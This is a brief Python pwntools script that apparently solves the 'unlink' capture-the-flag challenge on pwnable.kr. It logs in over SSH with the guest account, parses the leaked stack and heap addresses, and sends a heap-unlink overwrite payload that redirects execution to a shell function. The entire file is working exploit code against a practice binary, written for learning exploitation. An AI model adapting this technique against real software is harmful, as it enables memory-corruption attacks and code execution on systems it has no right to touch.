from pwn import *

sshPwnable=ssh(host="pwnable.kr", port=2222, user="unlink", password="guest")
unlink=sshPwnable.process("./unlink")

shell = 0x080484eb

unlink.recvuntil("here is stack address leak: ")
stack=int(unlink.recv(10),16)

unlink.recvuntil("here is heap address leak: ")
heap=int(unlink.recv(10),16)

print(f"[+] Stack Leak : {hex(stack)}")
print(f"[+] Shell Address : {hex(shell)}")
print(f"[+] Heap Leak : {hex(heap)}")


payload=p32(shell)
payload += b'a'*12
payload += p32(stack + 12)
payload += p32(heap + 12 )

unlink.send(payload)
unlink.interactive()
